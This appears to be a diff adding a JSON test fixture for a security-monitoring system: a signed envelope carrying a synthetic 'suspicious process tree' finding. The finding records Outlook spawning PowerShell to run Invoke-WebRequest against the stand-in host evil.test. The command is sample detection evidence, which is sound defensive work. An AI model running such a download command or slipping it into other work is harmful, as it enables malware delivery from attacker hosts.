@@ -1,0 +1,49 @@
+{
+  "schema": "swarm.spine.envelope.v1",
+  "issuer": "swarm:ed25519:5fa33029f70d52222fb3e88ab19ad1158158a8da7db100288a4b341e69774622",
+  "seq": 3,
+  "prev_envelope_hash": "0x8c95cdd6afe36e5bc9896c1b46d07c0e5b409cdcd49b1db429fbb5140dc00ec1",
+  "issued_at": "2026-03-17T09:14:41Z",
+  "capability_token": null,
+  "fact": {
+    "schema": "ambush.perch.finding.v1",
+    "issuer": {
+      "swarm_agent_id": "swarm:ed25519:18085f16811dba240c5bf9ef0c0d0bc6f359e7812cdedf86e7519852307ce470",
+      "role": null,
+      "nostr_pubkey": null
+    },
+    "emitted_at_ms": 1773738881130,
+    "locator": {
+      "finding_id": "suspicious_process_tree:hunt-evt-2",
+      "event_id": "hunt-evt-2",
+      "strategy_id": "suspicious_process_tree",
+      "host_id": "host-ops-1",
+      "lane_channel": "b8240a37-88b1-4a9f-8b77-5cc005891115"
+    },
+    "finding": {
+      "schema": "swarm_finding",
+      "finding_id": "suspicious_process_tree:hunt-evt-2",
+      "event_id": "hunt-evt-2",
+      "strategy_id": "suspicious_process_tree",
+      "threat_class": "execution",
+      "severity": "CRITICAL",
+      "confidence": 0.9,
+      "evidence": {
+        "source": "synthetic",
+        "parent_process": "OUTLOOK",
+        "process_name": "powershell",
+        "command_line": "powershell.exe Invoke-WebRequest https://evil.test",
+        "normalized_command_line": "powershell.exe invoke-webrequest https://evil.test",
+        "decoded_command_segments": [],
+        "command_line_transforms": [],
+        "user": "alice",
+        "host_id": "host-ops-1",
+        "heuristics": {
+          "encoded_flag": false,
+          "download_hint": true
+        }
+      }
+    }
+  },
+  "envelope_hash": "0x0cd2c532068bbc80354704012dd6b93ebd7e52b98b2a830fb13c0b51f411cf29"
+}
